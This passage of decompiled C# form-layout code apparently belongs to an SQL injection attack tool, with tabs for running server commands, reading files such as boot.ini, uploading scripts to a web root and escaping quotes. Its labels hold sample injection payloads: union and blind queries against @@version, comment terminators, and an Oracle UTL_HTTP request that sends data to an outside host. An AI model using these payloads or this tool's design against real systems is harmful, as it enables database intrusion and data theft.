		((Control)toolStripCommand).set_Name("toolStripCommand");
		((Control)toolStripCommand).set_Size(new Size(677, 25));
		((Control)toolStripCommand).set_TabIndex(6);
		((Control)toolStripCommand).set_Text("toolStrip1");
		((ToolStripItem)toolStripSeparator13).set_Name("toolStripSeparator13");
		((ToolStripItem)toolStripSeparator13).set_Size(new Size(6, 25));
		((ToolStripItem)txtCMD).set_Name("txtCMD");
		((ToolStripItem)txtCMD).set_Size(new Size(450, 25));
		((ToolStripItem)txtCMD).set_Text("dir c:\\");
		((ToolStripItem)btnCMD).set_DisplayStyle((ToolStripItemDisplayStyle)1);
		((ToolStripItem)btnCMD).set_Image((Image)componentResourceManager.GetObject("btnCMD.Image"));
		((ToolStripItem)btnCMD).set_ImageTransparentColor(Color.Magenta);
		((ToolStripItem)btnCMD).set_Name("btnCMD");
		((ToolStripItem)btnCMD).set_Size(new Size(51, 22));
		((ToolStripItem)btnCMD).set_Text("Execute");
		((ToolStripItem)btnCMD).add_Click((EventHandler)btnCMD_Click);
		((ToolStripItem)toolStripSeparator14).set_Name("toolStripSeparator14");
		((ToolStripItem)toolStripSeparator14).set_Size(new Size(6, 25));
		((Control)tabFileReader).get_Controls().Add((Control)(object)txtFileContent);
		((Control)tabFileReader).get_Controls().Add((Control)(object)toolFileReader);
		tabFileReader.set_ImageKey("file.png");
		tabFileReader.set_Location(new Point(4, 23));
		((Control)tabFileReader).set_Name("tabFileReader");
		((Control)tabFileReader).set_Size(new Size(677, 364));
		tabFileReader.set_TabIndex(3);
		((Control)tabFileReader).set_Text("FileReader");
		tabFileReader.set_UseVisualStyleBackColor(true);
		((Control)txtFileContent).set_Dock((DockStyle)5);
		((Control)txtFileContent).set_Location(new Point(0, 25));
		((TextBoxBase)txtFileContent).set_Multiline(true);
		((Control)txtFileContent).set_Name("txtFileContent");
		txtFileContent.set_ScrollBars((ScrollBars)3);
		((Control)txtFileContent).set_Size(new Size(677, 339));
		((Control)txtFileContent).set_TabIndex(4);
		toolFileReader.set_BackColor(SystemColors.ButtonFace);
		toolFileReader.set_GripStyle((ToolStripGripStyle)0);
		toolFileReader.get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[4]
		{
			(ToolStripItem)toolStripLabel6,
			(ToolStripItem)txtFileName,
			(ToolStripItem)btnReadFile,
			(ToolStripItem)toolStripSeparator10
		});
		((Control)toolFileReader).set_Location(new Point(0, 0));
		((Control)toolFileReader).set_Name("toolFileReader");
		((Control)toolFileReader).set_Size(new Size(677, 25));
		((Control)toolFileReader).set_TabIndex(0);
		((Control)toolFileReader).set_Text("ReadFile");
		((ToolStripItem)toolStripLabel6).set_Name("toolStripLabel6");
		((ToolStripItem)toolStripLabel6).set_Size(new Size(113, 22));
		((ToolStripItem)toolStripLabel6).set_Text("FilePath/FileName:");
		((ToolStripItem)txtFileName).set_Name("txtFileName");
		((ToolStripItem)txtFileName).set_Size(new Size(280, 25));
		((ToolStripItem)txtFileName).set_Text("C:/boot.ini");
		((ToolStripItem)btnReadFile).set_DisplayStyle((ToolStripItemDisplayStyle)1);
		((ToolStripItem)btnReadFile).set_Image((Image)componentResourceManager.GetObject("btnReadFile.Image"));
		((ToolStripItem)btnReadFile).set_ImageTransparentColor(Color.Magenta);
		((ToolStripItem)btnReadFile).set_Name("btnReadFile");
		((ToolStripItem)btnReadFile).set_Size(new Size(57, 22));
		((ToolStripItem)btnReadFile).set_Text("ReadFile");
		((ToolStripItem)btnReadFile).add_Click((EventHandler)btnReadFile_Click);
		((ToolStripItem)toolStripSeparator10).set_Name("toolStripSeparator10");
		((ToolStripItem)toolStripSeparator10).set_Size(new Size(6, 25));
		((Control)tabFileUploader).get_Controls().Add((Control)(object)btnGetWebRoot);
		((Control)tabFileUploader).get_Controls().Add((Control)(object)label3);
		((Control)tabFileUploader).get_Controls().Add((Control)(object)txtTargetFileName);
		((Control)tabFileUploader).get_Controls().Add((Control)(object)label2);
		((Control)tabFileUploader).get_Controls().Add((Control)(object)btnSelectFile);
		((Control)tabFileUploader).get_Controls().Add((Control)(object)btnFileUpload);
		((Control)tabFileUploader).get_Controls().Add((Control)(object)txtUploadFile);
		tabFileUploader.set_ImageKey("upload.png");
		tabFileUploader.set_Location(new Point(4, 23));
		((Control)tabFileUploader).set_Name("tabFileUploader");
		((Control)tabFileUploader).set_Size(new Size(677, 364));
		tabFileUploader.set_TabIndex(5);
		((Control)tabFileUploader).set_Text("FileUploader");
		tabFileUploader.set_UseVisualStyleBackColor(true);
		((Control)btnGetWebRoot).set_Location(new Point(477, 72));
		((Control)btnGetWebRoot).set_Name("btnGetWebRoot");
		((Control)btnGetWebRoot).set_Size(new Size(91, 23));
		((Control)btnGetWebRoot).set_TabIndex(6);
		((Control)btnGetWebRoot).set_Text("Get Web Root");
		((ButtonBase)btnGetWebRoot).set_UseVisualStyleBackColor(true);
		((Control)btnGetWebRoot).add_Click((EventHandler)btnGetWebRoot_Click);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Location(new Point(10, 78));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(107, 12));
		((Control)label3).set_TabIndex(5);
		((Control)label3).set_Text("Target Path Name:");
		((Control)txtTargetFileName).set_Location(new Point(121, 73));
		((Control)txtTargetFileName).set_Name("txtTargetFileName");
		((Control)txtTargetFileName).set_Size(new Size(349, 21));
		((Control)txtTargetFileName).set_TabIndex(4);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Location(new Point(8, 40));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(107, 12));
		((Control)label2).set_TabIndex(3);
		((Control)label2).set_Text("Text/Script File:");
		((Control)btnSelectFile).set_Location(new Point(476, 35));
		((Control)btnSelectFile).set_Name("btnSelectFile");
		((Control)btnSelectFile).set_Size(new Size(92, 23));
		((Control)btnSelectFile).set_TabIndex(2);
		((Control)btnSelectFile).set_Text("...");
		((ButtonBase)btnSelectFile).set_UseVisualStyleBackColor(true);
		((Control)btnSelectFile).add_Click((EventHandler)btnSelectFile_Click);
		((Control)btnFileUpload).set_Location(new Point(8, 114));
		((Control)btnFileUpload).set_Name("btnFileUpload");
		((Control)btnFileUpload).set_Size(new Size(75, 23));
		((Control)btnFileUpload).set_TabIndex(1);
		((Control)btnFileUpload).set_Text("Upload");
		((ButtonBase)btnFileUpload).set_UseVisualStyleBackColor(true);
		((Control)btnFileUpload).add_Click((EventHandler)btnFileUpload_Click);
		((Control)txtUploadFile).set_Location(new Point(121, 36));
		((Control)txtUploadFile).set_Name("txtUploadFile");
		((Control)txtUploadFile).set_Size(new Size(349, 21));
		((Control)txtUploadFile).set_TabIndex(0);
		((Control)tabEscapeString).get_Controls().Add((Control)(object)label17);
		((Control)tabEscapeString).get_Controls().Add((Control)(object)label16);
		((Control)tabEscapeString).get_Controls().Add((Control)(object)btnEncode);
		((Control)tabEscapeString).get_Controls().Add((Control)(object)txtEscapeString);
		((Control)tabEscapeString).get_Controls().Add((Control)(object)txtSourceString);
		((Control)tabEscapeString).get_Controls().Add((Control)(object)label6);
		((Control)tabEscapeString).get_Controls().Add((Control)(object)label5);
		tabEscapeString.set_ImageKey("escape.png");
		tabEscapeString.set_Location(new Point(4, 23));
		((Control)tabEscapeString).set_Name("tabEscapeString");
		((Control)tabEscapeString).set_Size(new Size(677, 364));
		tabEscapeString.set_TabIndex(6);
		((Control)tabEscapeString).set_Text("StringEncode");
		tabEscapeString.set_UseVisualStyleBackColor(true);
		((Control)label17).set_AutoSize(true);
		((Control)label17).set_Location(new Point(112, 102));
		((Control)label17).set_Name("label17");
		((Control)label17).set_Size(new Size(359, 12));
		((Control)label17).set_TabIndex(6);
		((Control)label17).set_Text("Escape single/double quotes filter, used for SQL Injection.");
		((Control)label16).set_AutoSize(true);
		((Control)label16).set_Location(new Point(112, 45));
		((Control)label16).set_Name("label16");
		((Control)label16).set_Size(new Size(353, 12));
		((Control)label16).set_TabIndex(5);
		((Control)label16).set_Text("Don't input the beginning and the end special char: ' or \"");
		((Control)btnEncode).set_Location(new Point(114, 133));
		((Control)btnEncode).set_Name("btnEncode");
		((Control)btnEncode).set_Size(new Size(75, 23));
		((Control)btnEncode).set_TabIndex(4);
		((Control)btnEncode).set_Text("Encode");
		((ButtonBase)btnEncode).set_UseVisualStyleBackColor(true);
		((Control)btnEncode).add_Click((EventHandler)btnEncode_Click);
		((Control)txtEscapeString).set_Location(new Point(114, 78));
		((Control)txtEscapeString).set_Name("txtEscapeString");
		((Control)txtEscapeString).set_Size(new Size(507, 21));
		((Control)txtEscapeString).set_TabIndex(3);
		((Control)txtSourceString).set_Location(new Point(114, 21));
		((Control)txtSourceString).set_Name("txtSourceString");
		((Control)txtSourceString).set_Size(new Size(507, 21));
		((Control)txtSourceString).set_TabIndex(2);
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Location(new Point(18, 82));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(89, 12));
		((Control)label6).set_TabIndex(1);
		((Control)label6).set_Text("String Encode:");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Location(new Point(18, 25));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(89, 12));
		((Control)label5).set_TabIndex(0);
		((Control)label5).set_Text("Source String:");
		((Control)tabDebug).get_Controls().Add((Control)(object)grpBlindType);
		tabDebug.set_ImageKey("tool.png");
		tabDebug.set_Location(new Point(4, 23));
		((Control)tabDebug).set_Name("tabDebug");
		((Control)tabDebug).set_Size(new Size(677, 364));
		tabDebug.set_TabIndex(4);
		((Control)tabDebug).set_Text("Debug");
		tabDebug.set_UseVisualStyleBackColor(true);
		((Control)grpBlindType).get_Controls().Add((Control)(object)label20);
		((Control)grpBlindType).get_Controls().Add((Control)(object)label21);
		((Control)grpBlindType).get_Controls().Add((Control)(object)label22);
		((Control)grpBlindType).get_Controls().Add((Control)(object)ComboBoxWebEncoding);
		((Control)grpBlindType).get_Controls().Add((Control)(object)label19);
		((Control)grpBlindType).get_Controls().Add((Control)(object)ComboBoxDBEncoding);
		((Control)grpBlindType).get_Controls().Add((Control)(object)label18);
		((Control)grpBlindType).get_Controls().Add((Control)(object)txtComment);
		((Control)grpBlindType).get_Controls().Add((Control)(object)lblComment);
		((Control)grpBlindType).get_Controls().Add((Control)(object)label4);
		((Control)grpBlindType).get_Controls().Add((Control)(object)label1);
		((Control)grpBlindType).get_Controls().Add((Control)(object)radioCrossSite);
		((Control)grpBlindType).get_Controls().Add((Control)(object)label15);
		((Control)grpBlindType).get_Controls().Add((Control)(object)label14);
		((Control)grpBlindType).get_Controls().Add((Control)(object)label13);
		((Control)grpBlindType).get_Controls().Add((Control)(object)label12);
		((Control)grpBlindType).get_Controls().Add((Control)(object)label11);
		((Control)grpBlindType).get_Controls().Add((Control)(object)label10);
		((Control)grpBlindType).get_Controls().Add((Control)(object)txtWildField);
		((Control)grpBlindType).get_Controls().Add((Control)(object)label9);
		((Control)grpBlindType).get_Controls().Add((Control)(object)btnSetEnv);
		((Control)grpBlindType).get_Controls().Add((Control)(object)btnGetEnv);
		((Control)grpBlindType).get_Controls().Add((Control)(object)label8);
		((Control)grpBlindType).get_Controls().Add((Control)(object)txtInjectField);
		((Control)grpBlindType).get_Controls().Add((Control)(object)label7);
		((Control)grpBlindType).get_Controls().Add((Control)(object)txtFieldNum);
		((Control)grpBlindType).get_Controls().Add((Control)(object)radioBlind);
		((Control)grpBlindType).get_Controls().Add((Control)(object)radioFieldEcho);
		((Control)grpBlindType).get_Controls().Add((Control)(object)radioPlainText);
		((Control)grpBlindType).set_Location(new Point(3, 13));
		((Control)grpBlindType).set_Name("grpBlindType");
		((Control)grpBlindType).set_Size(new Size(661, 344));
		((Control)grpBlindType).set_TabIndex(1);
		grpBlindType.set_TabStop(false);
		((Control)grpBlindType).set_Text("How to Get Data When SQL Injection (For Professional)");
		((Control)label20).set_AutoSize(true);
		((Control)label20).set_Location(new Point(239, 286));
		((Control)label20).set_Name("label20");
		((Control)label20).set_Size(new Size(389, 12));
		((Control)label20).set_TabIndex(29);
		((Control)label20).set_Text("Example: UTF-8  UTF-16(Unicode)  iso-8859-1(Latin1)  gb2312 big5");
		((Control)label21).set_AutoSize(true);
		((Control)label21).set_Location(new Point(239, 260));
		((Control)label21).set_Name("label21");
		((Control)label21).set_Size(new Size(389, 12));
		((Control)label21).set_TabIndex(28);
		((Control)label21).set_Text("Example: UTF-8  UTF-16(Unicode)  iso-8859-1(Latin1)  gb2312 big5");
		((Control)label22).set_AutoSize(true);
		((Control)label22).set_Location(new Point(19, 260));
		((Control)label22).set_Name("label22");
		((Control)label22).set_Size(new Size(83, 12));
		((Control)label22).set_TabIndex(27);
		((Control)label22).set_Text("Web Encoding:");
		((ListControl)ComboBoxWebEncoding).set_FormattingEnabled(true);
		ComboBoxWebEncoding.get_Items().AddRange(new object[5] { "UTF-8", "UTF-16", "iso-8859-1", "gb2312", "big5" });
		((Control)ComboBoxWebEncoding).set_Location(new Point(132, 256));
		((Control)ComboBoxWebEncoding).set_Name("ComboBoxWebEncoding");
		((Control)ComboBoxWebEncoding).set_Size(new Size(95, 20));
		((Control)ComboBoxWebEncoding).set_TabIndex(26);
		((Control)label19).set_AutoSize(true);
		((Control)label19).set_Location(new Point(19, 286));
		((Control)label19).set_Name("label19");
		((Control)label19).set_Size(new Size(113, 12));
		((Control)label19).set_TabIndex(24);
		((Control)label19).set_Text("Database Encoding:");
		((ListControl)ComboBoxDBEncoding).set_FormattingEnabled(true);
		ComboBoxDBEncoding.get_Items().AddRange(new object[5] { "UTF-8", "UTF-16", "iso-8859-1", "gb2312", "big5" });
		((Control)ComboBoxDBEncoding).set_Location(new Point(132, 282));
		((Control)ComboBoxDBEncoding).set_Name("ComboBoxDBEncoding");
		((Control)ComboBoxDBEncoding).set_Size(new Size(95, 20));
		((Control)ComboBoxDBEncoding).set_TabIndex(23);
		((Control)label18).set_AutoSize(true);
		((Control)label18).set_Location(new Point(239, 234));
		((Control)label18).set_Name("label18");
		((Control)label18).set_Size(new Size(341, 12));
		((Control)label18).set_TabIndex(22);
		((Control)label18).set_Text("Example: --  %23  %2D%2D  %20%2D%2D  +--+   /*  %00  ;--");
		((Control)txtComment).set_Location(new Point(132, 230));
		((Control)txtComment).set_Name("txtComment");
		((Control)txtComment).set_Size(new Size(95, 21));
		((Control)txtComment).set_TabIndex(21);
		((Control)lblComment).set_AutoSize(true);
		((Control)lblComment).set_Location(new Point(19, 234));
		((Control)lblComment).set_Name("lblComment");
		((Control)lblComment).set_Size(new Size(101, 12));
		((Control)lblComment).set_TabIndex(20);
		((Control)lblComment).set_Text("Comments String:");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Location(new Point(145, 213));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(491, 12));
		((Control)label4).set_TabIndex(19);
		((Control)label4).set_Text("'http://sec4app.com/test/info.php?id='||(select instance_name from v$instance))--");
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(145, 194));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(395, 12));
		((Control)label1).set_TabIndex(18);
		((Control)label1).set_Text("Example: http://127.0.0.1/topic.jsp?id=1 and 1=(UTL_HTTP.request(");
		((Control)radioCrossSite).set_AutoSize(true);
		((Control)radioCrossSite).set_Location(new Point(10, 192));
		((Control)radioCrossSite).set_Name("radioCrossSite");
		((Control)radioCrossSite).set_Size(new Size(77, 16));
		((Control)radioCrossSite).set_TabIndex(17);
		radioCrossSite.set_TabStop(true);
		((Control)radioCrossSite).set_Text("CrossSite");
		((ButtonBase)radioCrossSite).set_UseVisualStyleBackColor(true);
		((Control)label15).set_AutoSize(true);
		((Control)label15).set_Location(new Point(287, 101));
		((Control)label15).set_Name("label15");
		((Control)label15).set_Size(new Size(65, 12));
		((Control)label15).set_TabIndex(16);
		((Control)label15).set_Text("Example: 4");
		((Control)label14).set_AutoSize(true);
		((Control)label14).set_Location(new Point(287, 71));
		((Control)label14).set_Name("label14");
		((Control)label14).set_Size(new Size(65, 12));
		((Control)label14).set_TabIndex(15);
		((Control)label14).set_Text("Example: 3");
		((Control)label13).set_AutoSize(true);
		((Control)label13).set_Location(new Point(145, 158));
		((Control)label13).set_Name("label13");
		((Control)label13).set_Size(new Size(467, 12));
		((Control)label13).set_TabIndex(14);
		((Control)label13).set_Text("Example: http://127.0.0.1/topic.asp?id=10 and ascii(substr(@@version,1,1))<97");
		((Control)label12).set_AutoSize(true);
		((Control)label12).set_Location(new Point(145, 49));
		((Control)label12).set_Name("label12");
		((Control)label12).set_Size(new Size(497, 12));
		((Control)label12).set_TabIndex(13);
		((Control)label12).set_Text("Example: http://127.0.0.1/topic.asp?id=10 and 1=2 union all select 1,1,@@version,1");
		((Control)label11).set_AutoSize(true);
		((Control)label11).set_Location(new Point(145, 27));
		((Control)label11).set_Name("label11");
		((Control)label11).set_Size(new Size(347, 12));
		((Control)label11).set_TabIndex(12);
		((Control)label11).set_Text("Example: http://127.0.0.1/topic.asp?id=10 and 1=@@version");
		((Control)label10).set_AutoSize(true);
		((Control)label10).set_Location(new Point(287, 129));
		((Control)label10).set_Name("label10");
		((Control)label10).set_Size(new Size(305, 12));
		((Control)label10).set_TabIndex(11);
		((Control)label10).set_Text("Example: 1  (One of: 1/NULL/char(97)/chr(97) etc.)");
		((Control)txtWildField).set_Location(new Point(185, 126));
		((Control)txtWildField).set_Name("txtWildField");
		((Control)txtWildField).set_Size(new Size(90, 21));
		((Control)txtWildField).set_TabIndex(10);
		((Control)label9).set_AutoSize(true);
		((Control)label9).set_Location(new Point(43, 129));
		((Control)label9).set_Name("label9");
		((Control)label9).set_Size(new Size(137, 12));
		((Control)label9).set_TabIndex(9);
		((Control)label9).set_Text("Other Field Filled By:");
		((Control)btnSetEnv).set_Enabled(false);
		((Control)btnSetEnv).set_Location(new Point(185, 314));
		((Control)btnSetEnv).set_Name("btnSetEnv");
		((Control)btnSetEnv).set_Size(new Size(107, 23));
		((Control)btnSetEnv).set_TabIndex(8);
		((Control)btnSetEnv).set_Text("SetCurrentValue");
		((ButtonBase)btnSetEnv).set_UseVisualStyleBackColor(true);
		((Control)btnSetEnv).add_Click((EventHandler)btnSetEnv_Click);
		((Control)btnGetEnv).set_Location(new Point(22, 314));
		((Control)btnGetEnv).set_Name("btnGetEnv");
		((Control)btnGetEnv).set_Size(new Size(110, 23));
		((Control)btnGetEnv).set_TabIndex(7);
		((Control)btnGetEnv).set_Text("GetCurrentValue");
		((ButtonBase)btnGetEnv).set_UseVisualStyleBackColor(true);
		((Control)btnGetEnv).add_Click((EventHandler)btnGetEnv_Click);
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_Location(new Point(43, 71));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(131, 12));
		((Control)label8).set_TabIndex(6);
		((Control)label8).set_Text("Inject In Field(1-N):");
		((Control)txtInjectField).set_Location(new Point(185, 68));
		((Control)txtInjectField).set_Name("txtInjectField");
		((Control)txtInjectField).set_Size(new Size(90, 21));
		((Control)txtInjectField).set_TabIndex(5);
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Location(new Point(43, 101));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(125, 12));
		((Control)label7).set_TabIndex(4);
		((Control)label7).set_Text("Field Number In SQL:");
		((Control)txtFieldNum).set_Location(new Point(185, 98));
		((Control)txtFieldNum).set_Name("txtFieldNum");
		((Control)txtFieldNum).set_Size(new Size(90, 21));
		((Control)txtFieldNum).set_TabIndex(3);
		((Control)radioBlind).set_AutoSize(true);
		((Control)radioBlind).set_Location(new Point(10, 156));
		((Control)radioBlind).set_Name("radioBlind");
		((Control)radioBlind).set_Size(new Size(53, 16));
		((Control)radioBlind).set_TabIndex(2);
		radioBlind.set_TabStop(true);
		((Control)radioBlind).set_Text("Blind");
		((ButtonBase)radioBlind).set_UseVisualStyleBackColor(true);
		((Control)radioFieldEcho).set_AutoSize(true);
		((Control)radioFieldEcho).set_Location(new Point(10, 47));
		((Control)radioFieldEcho).set_Name("radioFieldEcho");
		((Control)radioFieldEcho).set_Size(new Size(53, 16));
		((Control)radioFieldEcho).set_TabIndex(1);
		radioFieldEcho.set_TabStop(true);
		((Control)radioFieldEcho).set_Text("Union");
		((ButtonBase)radioFieldEcho).set_UseVisualStyleBackColor(true);
		((Control)radioPlainText).set_AutoSize(true);
		((Control)radioPlainText).set_Location(new Point(10, 25));
		((Control)radioPlainText).set_Name("radioPlainText");
		((Control)radioPlainText).set_Size(new Size(77, 16));
		((Control)radioPlainText).set_TabIndex(0);
		radioPlainText.set_TabStop(true);
		((Control)radioPlainText).set_Text("PlainText");
		((ButtonBase)radioPlainText).set_UseVisualStyleBackColor(true);
		toolStripSQL.set_BackColor(SystemColors.ButtonFace);
		toolStripSQL.set_GripStyle((ToolStripGripStyle)0);
		toolStripSQL.get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[11]
		{
			(ToolStripItem)toolStripLabel1,
			(ToolStripItem)cmbDBTypeList,
			(ToolStripItem)toolStripSeparator1,
			(ToolStripItem)toolStripLabel2,
			(ToolStripItem)txtKeyWord,
			(ToolStripItem)toolStripSeparator2,
			(ToolStripItem)toolStripLabel3,
			(ToolStripItem)cmbInjectionType,
			(ToolStripItem)toolStripSeparator3,
			(ToolStripItem)ButtonResetSQL,
			(ToolStripItem)toolStripSeparator20
		});
		((Control)toolStripSQL).set_Location(new Point(0, 0));
		((Control)toolStripSQL).set_Name("toolStripSQL");
		((Control)toolStripSQL).set_Size(new Size(685, 25));
		((Control)toolStripSQL).set_TabIndex(1);
		((Control)toolStripSQL).set_Text("SQL Injection");
		((ToolStripItem)toolStripLabel1).set_Name("toolStripLabel1");
		((ToolStripItem)toolStripLabel1).set_Size(new Size(59, 22));
		((ToolStripItem)toolStripLabel1).set_Text("DataBase:");
		cmbDBTypeList.set_DropDownStyle((ComboBoxStyle)2);
		cmbDBTypeList.get_Items().AddRange(new object[7] { "UnKnown", "SQLServer", "MySQL", "Oracle", "DB2", "Access", "Other" });
		((ToolStripItem)cmbDBTypeList).set_Name("cmbDBTypeList");
		((ToolStripItem)cmbDBTypeList).set_Size(new Size(80, 25));
		cmbDBTypeList.add_DropDownClosed((EventHandler)cmbDBTypeList_DropDownClosed);
		((ToolStripItem)toolStripSeparator1).set_Name("toolStripSeparator1");
		((ToolStripItem)toolStripSeparator1).set_Size(new Size(6, 25));
		((ToolStripItem)toolStripLabel2).set_Name("toolStripLabel2");
		((ToolStripItem)toolStripLabel2).set_Size(new Size(53, 22));
		((ToolStripItem)toolStripLabel2).set_Text("KeyWord:");
		((ToolStripItem)txtKeyWord).set_Name("txtKeyWord");
		((ToolStripItem)txtKeyWord).set_Size(new Size(150, 25));
		((ToolStripItem)toolStripSeparator2).set_Name("toolStripSeparator2");
		((ToolStripItem)toolStripSeparator2).set_Size(new Size(6, 25));
		((ToolStripItem)toolStripLabel3).set_Name("toolStripLabel3");
		((ToolStripItem)toolStripLabel3).set_Size(new Size(95, 22));
		((ToolStripItem)toolStripLabel3).set_Text("Injection Type:");
		cmbInjectionType.set_DropDownStyle((ComboBoxStyle)2);
		cmbInjectionType.get_Items().AddRange(new object[4] { "UnKnown", "Integer", "String", "Search" });
		((ToolStripItem)cmbInjectionType).set_Name("cmbInjectionType");
		((ToolStripItem)cmbInjectionType).set_Size(new Size(80, 25));
		cmbInjectionType.add_DropDownClosed((EventHandler)cmbInjectionType_DropDownClosed);
		((ToolStripItem)toolStripSeparator3).set_Name("toolStripSeparator3");
		((ToolStripItem)toolStripSeparator3).set_Size(new Size(6, 25));
		((ToolStripItem)ButtonResetSQL).set_DisplayStyle((ToolStripItemDisplayStyle)1);
		((ToolStripItem)ButtonResetSQL).set_Image((Image)componentResourceManager.GetObject("ButtonResetSQL.Image"));
		((ToolStripItem)ButtonResetSQL).set_ImageTransparentColor(Color.Magenta);
		((ToolStripItem)ButtonResetSQL).set_Name("ButtonResetSQL");
		((ToolStripItem)ButtonResetSQL).set_Size(new Size(39, 22));
		((ToolStripItem)ButtonResetSQL).set_Text("Reset");
		((ToolStripItem)ButtonResetSQL).add_Click((EventHandler)ButtonResetSQL_Click);
		((ToolStripItem)toolStripSeparator20).set_Name("toolStripSeparator20");
		((ToolStripItem)toolStripSeparator20).set_Size(new Size(6, 25));
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(685, 416));
		((Control)this).get_Controls().Add((Control)(object)tabSQLInjection);
		((Control)this).get_Controls().Add((Control)(object)toolStripSQL);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("FormSQL");
		((Control)this).set_Text("SQLInjection");
		((Control)tabSQLInjection).ResumeLayout(false);
		((Control)tabEnv).ResumeLayout(false);
		((Control)tabEnv).PerformLayout();
		((Control)toolStripEnv).ResumeLayout(false);
		((Control)toolStripEnv).PerformLayout();
		((Control)tabDatabase).ResumeLayout(false);
		((Control)splitDB.get_Panel1()).ResumeLayout(false);
		((Control)splitDB.get_Panel1()).PerformLayout();
		((Control)splitDB.get_Panel2()).ResumeLayout(false);
		((Control)splitDB.get_Panel2()).PerformLayout();
		((Control)splitDB).ResumeLayout(false);
		((Control)toolStripDB).ResumeLayout(false);
		((Control)toolStripDB).PerformLayout();
		((Control)toolStripData).ResumeLayout(false);
		((Control)toolStripData).PerformLayout();
		((Control)tabCMD).ResumeLayout(false);
		((Control)tabCMD).PerformLayout();
		((Control)toolStripDBCMD).ResumeLayout(false);
		((Control)toolStripDBCMD).PerformLayout();
		((Control)toolStripCommand).ResumeLayout(false);
		((Control)toolStripCommand).PerformLayout();
		((Control)tabFileReader).ResumeLayout(false);
		((Control)tabFileReader).PerformLayout();
		((Control)toolFileReader).ResumeLayout(false);
		((Control)toolFileReader).PerformLayout();
		((Control)tabFileUploader).ResumeLayout(false);
		((Control)tabFileUploader).PerformLayout();
		((Control)tabEscapeString).ResumeLayout(false);
		((Control)tabEscapeString).PerformLayout();
		((Control)tabDebug).ResumeLayout(false);
		((Control)grpBlindType).ResumeLayout(false);
		((Control)grpBlindType).PerformLayout();
		((Control)toolStripSQL).ResumeLayout(false);
		((Control)toolStripSQL).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
